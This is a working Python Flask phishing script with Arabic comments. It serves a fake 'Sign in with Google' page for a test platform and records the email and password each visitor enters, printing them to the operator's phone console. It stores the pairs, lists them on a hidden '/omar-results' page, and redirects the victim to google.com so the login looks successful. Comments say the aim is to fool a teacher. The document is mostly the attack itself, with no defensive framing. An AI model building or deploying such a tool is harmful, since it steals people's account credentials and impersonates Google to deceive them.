from flask import Flask, request, redirect

app = Flask(__name__)

# قائمة لخزن البيانات (تختفي إذا أطفأت البرنامج)
captured_data = []

# تصميم الصفحة (واجهة تسجيل دخول أنيقة ومقنعة)
HTML_PAGE = '''
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
        h2 { color: #1877f2; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 15px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2 style="color: #4285F4;">تسجيل الدخول عبر Google</h2>
        <p style="font-size: 14px; color: #555;">استخدم حسابك للوصول إلى منصة الاختبارات</p>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">التالي</button>
        </form>
        <div class="footer">نظام حماية البيانات - 2026</div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    # استلام البيانات من الخانات
    email = request.form.get('email')
    password = request.form.get('password')
    
    # طباعة البيانات فوراً في الشاشة السوداء بالـ Pydroid (حتى تلاحظها أنت)
    print(f"\n[!] تم سحب بيانات جديدة:")
    print(f"📧 الحساب المستهدف: {email}")
    print(f"🔑 كلمة السر: {password}")
    print("-" * 30)
    
    # خزن البيانات في القائمة لرؤيتها لاحقاً
    captured_data.append({"email": email, "password": password})
    
    # التمويه: تحويل المعلم لموقع جوجل الحقيقي ليعتقد أن الدخول تم بنجاح
    return redirect("https://www.google.com")

@app.route('/omar-results')
def show_results():
    if not captured_data:
        return "<h1 style='text-align:center; padding-top:50px;'>القائمة فارغة.. لم يتم صيد أحد بعد!</h1>"
    
    output = "<h1>البيانات التي سحبتها يا عمر:</h1><table border='1' style='width:100%; text-align:center;'>"
    output += "<tr><th>الحساب</th><th>كلمة السر</th></tr>"
    for data in captured_data:
        output += f"<tr><td>{data['email']}</td><td>{data['password']}</td></tr>"
    output += "</table>"
    return f"<div dir='rtl' style='padding:20px; font-family:sans-serif;'>{output}</div>"

if __name__ == '__main__':
    # تشغيل السيرفر على موبايلك
    app.run(host='0.0.0.0', port=5000)

